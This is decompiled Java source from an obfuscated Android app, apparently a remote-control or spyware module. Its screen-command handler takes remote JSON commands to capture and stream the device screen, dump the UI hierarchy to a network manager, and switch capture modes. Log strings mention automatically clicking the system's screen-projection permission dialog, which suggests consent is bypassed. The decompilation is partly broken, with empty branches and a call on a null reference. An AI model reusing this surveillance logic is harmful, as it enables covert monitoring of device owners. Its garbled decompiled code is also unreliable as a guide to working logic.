package p000;

import com.storm.safe.rock.AbstractC0241a0;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.manager.C0263a5;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import java.util.Locale;
import java.util.Set;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class lu0 implements InterfaceC0726jp {
    static {
        new ku0(null);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("screen_mode", "screen_quality", "SCREEN_QUALITY", "GET_UI_HIERARCHY", "SCREEN_CAPTURE_RESUME", "SCREEN_CAPTURE_PAUSE", "SCREEN_CAPTURE_STOP", "SCREEN_CAPTURE_SET_TECH", "SCREEN_CAPTURE_DISABLE");
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Failed to find 'out' block for switch in B:30:0x0097. Please report as an issue. */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue
    java.lang.NullPointerException: Cannot invoke "java.util.List.iterator()" because the return value of "jadx.core.dex.visitors.regions.SwitchOverStringVisitor$SwitchData.getNewCases()" is null
    	at jadx.core.dex.visitors.regions.SwitchOverStringVisitor.restoreSwitchOverString(SwitchOverStringVisitor.java:109)
    	at jadx.core.dex.visitors.regions.SwitchOverStringVisitor.visitRegion(SwitchOverStringVisitor.java:66)
    	at jadx.core.dex.visitors.regions.DepthRegionTraversal.traverseIterativeStepInternal(DepthRegionTraversal.java:77)
    	at jadx.core.dex.visitors.regions.DepthRegionTraversal.traverseIterativeStepInternal(DepthRegionTraversal.java:82)
     */
    /* JADX WARN: Removed duplicated region for block: B:150:0x0264  */
    /* JADX WARN: Removed duplicated region for block: B:159:0x0282  */
    /* JADX WARN: Removed duplicated region for block: B:160:0x028d  */
    /* JADX WARN: Removed duplicated region for block: B:165:0x02a5  */
    /* JADX WARN: Removed duplicated region for block: B:54:0x00dd  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x00de  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x00e2 A[Catch: Exception -> 0x00a3, TryCatch #3 {Exception -> 0x00a3, blocks: (B:27:0x0084, B:29:0x008a, B:30:0x0097, B:60:0x0104, B:32:0x009c, B:43:0x00b4, B:37:0x00a6, B:52:0x00d2, B:57:0x00e2, B:59:0x00ff, B:58:0x00fa, B:40:0x00ad, B:44:0x00be, B:47:0x00c5, B:50:0x00cc, B:61:0x010d), top: B:193:0x0084 }] */
    /* JADX WARN: Removed duplicated region for block: B:58:0x00fa A[Catch: Exception -> 0x00a3, TryCatch #3 {Exception -> 0x00a3, blocks: (B:27:0x0084, B:29:0x008a, B:30:0x0097, B:60:0x0104, B:32:0x009c, B:43:0x00b4, B:37:0x00a6, B:52:0x00d2, B:57:0x00e2, B:59:0x00ff, B:58:0x00fa, B:40:0x00ad, B:44:0x00be, B:47:0x00c5, B:50:0x00cc, B:61:0x010d), top: B:193:0x0084 }] */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        String strOptString;
        C0260a2 c0260a2;
        switch (str.hashCode()) {
            case -1469776852:
                if (str.equals("screen_quality")) {
                    strOptString = jSONObject != null ? jSONObject.optString("mode", "fixed") : null;
                    String str2 = strOptString != null ? strOptString : "fixed";
                    int iOptInt = jSONObject != null ? jSONObject.optInt("quality", 80) : 80;
                    int iOptInt2 = jSONObject != null ? jSONObject.optInt("fps", 15) : 15;
                    double dOptDouble = jSONObject != null ? jSONObject.optDouble("scale", 0.7d) : 0.7d;
                    StringBuilder sbM40c1 = AbstractC0003a2.m40c1("设置投屏质量: mode=", str2, ", quality=", iOptInt, ", fps=");
                    sbM40c1.append(iOptInt2);
                    sbM40c1.append(", scale=");
                    sbM40c1.append(dOptDouble);
                    t60.m214714d6("ScreenCmdHandler", sbM40c1.toString());
                    if (!str2.equals("auto")) {
                        uz0Var.f60536a0.m211458e7(false);
                        uz0Var.f60536a0.m211519l6(iOptInt, iOptInt2, dOptDouble);
                        break;
                    } else {
                        uz0Var.f60536a0.m211458e7(true);
                        t60.m214714d6("ScreenCmdHandler", "已开启自适应投屏质量模式");
                        break;
                    }
                }
                break;
            case -43281002:
                if (str.equals("screen_mode")) {
                    strOptString = jSONObject != null ? jSONObject.optString("mode", "accessibility") : null;
                    String str3 = strOptString == null ? "accessibility" : strOptString;
                    t60.m214714d6("ScreenCmdHandler", "切换投屏模式: ".concat(str3));
                    C0263a5 c0263a5M214870a6 = uz0Var.m214870a6();
                    if (c0263a5M214870a6 == null) {
                        t60.m214726f4("ScreenCmdHandler", "etzbzyzqxvqm 未初始化");
                        break;
                    } else {
                        String lowerCase = str3.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        switch (lowerCase.hashCode()) {
                            case -1969960369:
                                if (!lowerCase.equals("projection")) {
                                    t60.m214726f4("ScreenCmdHandler", "未知投屏模式: ".concat(str3));
                                    break;
                                } else {
                                    c0263a5M214870a6.m211353a9();
                                    t60.m214714d6("ScreenCmdHandler", "已请求系统投屏权限");
                                    break;
                                }
                            case -1489720013:
                                if (!lowerCase.equals("mediaprojection")) {
                                }
                                break;
                            case -887328209:
                                if (!lowerCase.equals("system")) {
                                }
                                break;
                            case -213139122:
                                if (lowerCase.equals("accessibility")) {
                                    c0263a5M214870a6.m211358b5();
                                    t60.m214714d6("ScreenCmdHandler", "已切换到无障碍截图模式");
                                    break;
                                }
                                break;
                            case 3491:
                                if (!lowerCase.equals("mp")) {
                                }
                                break;
                            case 96385:
                                if (!lowerCase.equals("acc")) {
                                }
                                break;
                        }
                    }
                }
                break;
            case 152482414:
                if (str.equals("SCREEN_CAPTURE_STOP")) {
                    t60.m214714d6("ScreenCmdHandler", "停止屏幕捕获");
                    try {
                        C0263a5 c0263a5M214870a62 = uz0Var.m214870a6();
                        if (c0263a5M214870a62 != null) {
                            c0263a5M214870a62.m211357b4();
                            t60.m214714d6("ScreenCmdHandler", "屏幕捕获已停止");
                        } else {
                            t60.m214726f4("ScreenCmdHandler", "etzbzyzqxvqm 未初始化");
                        }
                        break;
                    } catch (Exception e) {
                        t60.m214705c6("ScreenCmdHandler", "停止屏幕捕获失败", e);
                        break;
                    }
                }
                break;
            case 428656874:
                if (str.equals("SCREEN_CAPTURE_PAUSE")) {
                    t60.m214714d6("ScreenCmdHandler", "暂停屏幕捕获");
                    try {
                        C0263a5 c0263a5M214870a63 = uz0Var.m214870a6();
                        if (c0263a5M214870a63 != null) {
                            c0263a5M214870a63.m211352a8();
                            t60.m214714d6("ScreenCmdHandler", "屏幕捕获已暂停");
                        } else {
                            t60.m214726f4("ScreenCmdHandler", "etzbzyzqxvqm 未初始化");
                        }
                        break;
                    } catch (Exception e2) {
                        t60.m214705c6("ScreenCmdHandler", "暂停屏幕捕获失败", e2);
                        break;
                    }
                }
                break;
            case 464356249:
                if (str.equals("SCREEN_CAPTURE_RESUME")) {
                    t60.m214714d6("ScreenCmdHandler", "恢复屏幕捕获");
                    try {
                        C0263a5 c0263a5M214870a64 = uz0Var.m214870a6();
                        if (c0263a5M214870a64 != null) {
                            c0263a5M214870a64.m211354b0();
                            t60.m214714d6("ScreenCmdHandler", "屏幕捕获已恢复");
                        } else {
                            t60.m214726f4("ScreenCmdHandler", "etzbzyzqxvqm 未初始化");
                        }
                        break;
                    } catch (Exception e3) {
                        t60.m214705c6("ScreenCmdHandler", "恢复屏幕捕获失败", e3);
                        break;
                    }
                }
                break;
            case 579828748:
                if (str.equals("SCREEN_QUALITY")) {
                }
                break;
            case 899431571:
                if (str.equals("GET_UI_HIERARCHY")) {
                    try {
                        t60.m214714d6("ScreenCmdHandler", "处理 GET_UI_HIERARCHY 命令");
                        long jCurrentTimeMillis = System.currentTimeMillis();
                        dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
                        if (jCurrentTimeMillis - dqtvuisjdVar.f52412e3 >= 800) {
                            dqtvuisjdVar.f52412e3 = jCurrentTimeMillis;
                            if (jSONObject != null) {
                                jSONObject.optBoolean("includeInvisible", false);
                            }
                            if (jSONObject != null) {
                                jSONObject.optBoolean("includeNonInteractive", true);
                            }
                            JSONObject jSONObjectM214864a0 = uz0Var.m214864a0(jSONObject != null ? jSONObject.optInt("maxDepth", 18) : 18);
                            if (jSONObjectM214864a0 == null) {
                                t60.m214726f4("ScreenCmdHandler", "获取UI层次结构失败");
                                break;
                            } else {
                                C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
                                if (c0323a8M214869a5 == null) {
                                    t60.m214726f4("ScreenCmdHandler", "NetworkManager 未初始化");
                                    break;
                                } else {
                                    c0323a8M214869a5.m211667d3(jSONObjectM214864a0);
                                    t60.m214714d6("ScreenCmdHandler", "UI层次结构已发送");
                                    break;
                                }
                            }
                        } else {
                            t60.m214726f4("ScreenCmdHandler", "UI层次结构请求过于频繁，跳过");
                            break;
                        }
                    } catch (Exception e4) {
                        t60.m214705c6("ScreenCmdHandler", "处理 GET_UI_HIERARCHY 命令失败", e4);
                        break;
                    }
                }
                break;
            case 1350641887:
                if (str.equals("SCREEN_CAPTURE_SET_TECH")) {
                    String strOptString2 = jSONObject != null ? jSONObject.optString("tech", "accessibility") : null;
                    if (strOptString2 == null) {
                        strOptString2 = "accessibility";
                    }
                    t60.m214714d6("ScreenCmdHandler", "切换投屏技术模式: ".concat(strOptString2));
                    try {
                        C0263a5 c0263a5M214870a65 = uz0Var.m214870a6();
                        if (c0263a5M214870a65 == null) {
                            t60.m214726f4("ScreenCmdHandler", "etzbzyzqxvqm 未初始化");
                            break;
                        } else {
                            String lowerCase2 = strOptString2.toLowerCase(Locale.ROOT);
                            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                            switch (lowerCase2.hashCode()) {
                                case -1969960369:
                                    if (!lowerCase2.equals("projection")) {
                                        t60.m214726f4("ScreenCmdHandler", "未知投屏技术: ".concat(strOptString2));
                                        break;
                                    } else {
                                        t60.m214714d6("ScreenCmdHandler", "启用系统投屏模式");
                                        c0260a2 = uz0Var.f60536a0.f52369a0;
                                        if (c0260a2 != null) {
                                            c0260a2 = null;
                                        }
                                        if (c0260a2 == null) {
                                            t60.m214726f4("MediaProjectionHolder", "🧹 清理权限数据（权限可能已过期）");
                                            AbstractC0241a0.f51907a1 = null;
                                            AbstractC0241a0.f51908a2 = null;
                                            AbstractC0241a0.f51909a3 = 0L;
                                            t60.m214714d6("ScreenCmdHandler", "已清理旧MediaProjection权限数据");
                                            c0260a2.m211325g8(true);
                                            t60.m214714d6("ScreenCmdHandler", "已设置MediaProjection请求标志为true");
                                        } else {
                                            t60.m214726f4("ScreenCmdHandler", "PermissionGranter 未初始化，投屏弹窗可能无法自动点击");
                                        }
                                        c0263a5M214870a65.m211353a9();
                                        break;
                                    }
                                case -1489720013:
                                    if (!lowerCase2.equals("mediaprojection")) {
                                        t60.m214726f4("ScreenCmdHandler", "未知投屏技术: ".concat(strOptString2));
                                        break;
                                    }
                                    t60.m214714d6("ScreenCmdHandler", "启用系统投屏模式");
                                    c0260a2 = uz0Var.f60536a0.f52369a0;
                                    if (c0260a2 != null) {
                                    }
                                    if (c0260a2 == null) {
                                    }
                                    c0263a5M214870a65.m211353a9();
                                    break;
                                case -887328209:
                                    if (!lowerCase2.equals("system")) {
                                        t60.m214726f4("ScreenCmdHandler", "未知投屏技术: ".concat(strOptString2));
                                        break;
                                    }
                                    t60.m214714d6("ScreenCmdHandler", "启用系统投屏模式");
                                    c0260a2 = uz0Var.f60536a0.f52369a0;
                                    if (c0260a2 != null) {
                                    }
                                    if (c0260a2 == null) {
                                    }
                                    c0263a5M214870a65.m211353a9();
                                    break;
                                case -213139122:
                                    if (!lowerCase2.equals("accessibility")) {
                                        t60.m214726f4("ScreenCmdHandler", "未知投屏技术: ".concat(strOptString2));
                                        break;
                                    }
                                    t60.m214714d6("ScreenCmdHandler", "启用无障碍投屏模式");
                                    c0263a5M214870a65.m211358b5();
                                    break;
                                case 3491:
                                    if (!lowerCase2.equals("mp")) {
                                        t60.m214726f4("ScreenCmdHandler", "未知投屏技术: ".concat(strOptString2));
                                        break;
                                    }
                                    t60.m214714d6("ScreenCmdHandler", "启用系统投屏模式");
                                    c0260a2 = uz0Var.f60536a0.f52369a0;
                                    if (c0260a2 != null) {
                                    }
                                    if (c0260a2 == null) {
                                    }
                                    c0263a5M214870a65.m211353a9();
                                    break;
                                case 96385:
                                    if (!lowerCase2.equals("acc")) {
                                        t60.m214726f4("ScreenCmdHandler", "未知投屏技术: ".concat(strOptString2));
                                        break;
                                    }
                                    t60.m214714d6("ScreenCmdHandler", "启用无障碍投屏模式");
                                    c0263a5M214870a65.m211358b5();
                                    break;
                                default:
                                    t60.m214726f4("ScreenCmdHandler", "未知投屏技术: ".concat(strOptString2));
                                    break;
                            }
                        }
                    } catch (Exception e5) {
                        t60.m214705c6("ScreenCmdHandler", "切换投屏技术模式失败", e5);
                        break;
                    }
                }
                break;
            case 2083902684:
                if (str.equals("SCREEN_CAPTURE_DISABLE")) {
                    t60.m214714d6("ScreenCmdHandler", "关闭所有投屏模式");
                    try {
                        C0263a5 c0263a5M214870a66 = uz0Var.m214870a6();
                        if (c0263a5M214870a66 != null) {
                            c0263a5M214870a66.m211357b4();
                            t60.m214726f4("MediaProjectionHolder", "🧹 清理权限数据（权限可能已过期）");
                            AbstractC0241a0.f51907a1 = null;
                            AbstractC0241a0.f51908a2 = null;
                            AbstractC0241a0.f51909a3 = 0L;
                            t60.m214714d6("ScreenCmdHandler", "所有投屏模式已关闭");
                        } else {
                            t60.m214726f4("ScreenCmdHandler", "etzbzyzqxvqm 未初始化");
                        }
                        break;
                    } catch (Exception e6) {
                        t60.m214705c6("ScreenCmdHandler", "关闭投屏模式失败", e6);
                        break;
                    }
                }
                break;
        }
        return C1351vv.f60710b1;
    }
}
